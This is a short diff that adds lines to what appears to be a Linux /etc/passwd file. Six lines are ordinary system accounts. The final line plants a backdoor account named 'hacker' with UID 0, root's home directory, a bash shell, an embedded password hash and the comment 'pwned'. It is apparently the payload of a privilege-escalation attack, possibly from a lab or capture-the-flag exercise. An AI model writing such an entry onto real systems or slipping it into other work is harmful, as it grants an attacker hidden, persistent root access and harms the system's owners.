@@ -1,0 +1,7 @@
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+hacker:$6$salt$IxDD3jeSOb5eB1CX5LBsqZFVkJdido3OUILO5Ip.OBEANNd9m3A7gvFLGVn08JOXZ7qnXa1OGo.xrUQbXDTT1:0:0:pwned:/root:/bin/bash
